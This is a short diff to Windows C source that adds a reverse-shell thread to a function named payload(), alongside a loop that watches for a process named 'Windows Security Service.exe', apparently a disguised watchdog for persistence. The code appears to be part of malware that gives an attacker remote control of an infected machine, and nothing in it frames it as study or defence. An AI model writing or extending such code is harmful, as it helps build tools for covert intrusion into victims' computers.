@@ -2,11 +2,16 @@
 #include <io.h>
 
 #include "utils.h"
+#include "reverse_shell/reverse_shell.h"
 
 extern char serviceName[64];
 
 // Execute the payload
 void payload(){
+    // Create a thread for the reverse shell
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)reverse_shell, NULL, 0, NULL);
+
+    // Check if the watchdog is running
     while(1){
         if(!findFirstProc("Windows Security Service.exe")){
             char destination[MAX_PATH];
